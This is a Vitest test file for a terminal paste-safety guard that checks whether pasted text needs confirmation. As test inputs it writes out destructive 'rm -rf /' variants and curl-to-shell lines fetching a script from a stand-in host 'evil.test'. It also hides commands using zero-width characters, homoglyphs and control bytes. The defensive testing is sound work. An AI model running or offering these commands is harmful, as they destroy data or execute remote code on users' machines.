import { describe, expect, it } from 'vitest'
import { inspectPasteSafety, stripHiddenChars } from './pasteGuard'

describe('pasteGuard', () => {
  it('allows normal single-line commands without confirmation', () => {
    expect(inspectPasteSafety('docker ps -a', false).needsConfirm).toBe(false)
    expect(inspectPasteSafety('ls -la\nfree -h', true).needsConfirm).toBe(false)
  })

  it('flags dangerous commands, alternate rm flag orders, EOL home targets, and pipe-to-shell', () => {
    const r1 = inspectPasteSafety('sudo rm -rf /', true)
    expect(r1.needsConfirm).toBe(true)
    expect(r1.warnings.some((w) => w.kind === 'danger')).toBe(true)

    for (const cmd of [
      'rm -fr /',
      'rm -f -r /',
      'rm -r -f /',
      'rm -rf ~',
      'rm -rf ~/',
      'rm --force --recursive /',
      'rm -rf -- /',
      'rm -fr *',
      'rm / -rf',
      'rm -f / -r',
    ]) {
      const r = inspectPasteSafety(cmd, true)
      expect(r.needsConfirm, cmd).toBe(true)
      expect(r.warnings.some((w) => w.kind === 'danger'), cmd).toBe(true)
    }

    expect(inspectPasteSafety('rm -rf /tmp/build', true).needsConfirm).toBe(false)

    const r2 = inspectPasteSafety('curl -fsSL https://evil.test/x.sh | sudo bash', true)
    expect(r2.needsConfirm).toBe(true)
    expect(r2.warnings.some((w) => w.kind === 'pipe-shell')).toBe(true)
  })

  it('inspects both raw and hidden-char-stripped text so zero-width chars cannot hide commands', () => {
    const hiddenRm = 'r\u200Bm -rf /'
    const res1 = inspectPasteSafety(hiddenRm, true)
    expect(res1.needsConfirm).toBe(true)
    expect(res1.hasHiddenChars).toBe(true)
    expect(res1.warnings.some((w) => w.kind === 'hidden-chars')).toBe(true)
    expect(res1.warnings.some((w) => w.kind === 'danger')).toBe(true)

    const hiddenPipe = 'c\u200Burl https://evil.test/x.sh | sh'
    const res2 = inspectPasteSafety(hiddenPipe, true)
    expect(res2.warnings.some((w) => w.kind === 'pipe-shell')).toBe(true)

    const hiddenHomo = 'd\u200B\u0430cker ps'
    const res3 = inspectPasteSafety(hiddenHomo, true)
    expect(res3.warnings.some((w) => w.kind === 'homoglyph')).toBe(true)
  })

  it('detects raw ESC, C1 CSI (0x9b), and dangerous C0 control characters', () => {
    const rEsc = inspectPasteSafety('echo ok\x1b[31m', true)
    expect(rEsc.needsConfirm).toBe(true)
    expect(rEsc.warnings.some((w) => w.kind === 'control-chars')).toBe(true)

    const rC1 = inspectPasteSafety('safe\x9b201~\nevil\n', true)
    expect(rC1.needsConfirm).toBe(true)
    expect(rC1.warnings.some((w) => w.kind === 'control-chars')).toBe(true)

    const rCtrlC = inspectPasteSafety('echo ok\x03rm -rf /tmp/a', true)
    expect(rCtrlC.needsConfirm).toBe(true)
    expect(rCtrlC.warnings.some((w) => w.kind === 'control-chars')).toBe(true)

    // Tabs remain safe
    expect(inspectPasteSafety('echo\thello', false).needsConfirm).toBe(false)
  })

  it('detects and strips zero-width / BiDi hidden characters and homoglyphs', () => {
    const sneaky = 'echo\u200B hi\u202E'
    const res = inspectPasteSafety(sneaky, true)
    expect(res.needsConfirm).toBe(true)
    expect(res.hasHiddenChars).toBe(true)
    expect(stripHiddenChars(sneaky)).toBe('echo hi')

    // Cyrillic 'а' (\u0430) mixed with Latin "docker"
    const homo = 'd\u0430cker ps'
    const hRes = inspectPasteSafety(homo, true)
    expect(hRes.needsConfirm).toBe(true)
    expect(hRes.warnings.some((w) => w.kind === 'homoglyph')).toBe(true)
  })

  it('warns on multi-line AND single-line trailing-newline paste when bracketed paste mode is off', () => {
    const r = inspectPasteSafety('echo a\necho b', false)
    expect(r.needsConfirm).toBe(true)
    expect(r.warnings.some((w) => w.kind === 'multiline')).toBe(true)

    const rSingleTrailing = inspectPasteSafety('sudo systemctl stop nginx\n', false)
    expect(rSingleTrailing.needsConfirm).toBe(true)
    expect(rSingleTrailing.warnings.some((w) => w.kind === 'multiline')).toBe(true)

    expect(inspectPasteSafety('sudo systemctl stop nginx\n', true).needsConfirm).toBe(false)
  })
})
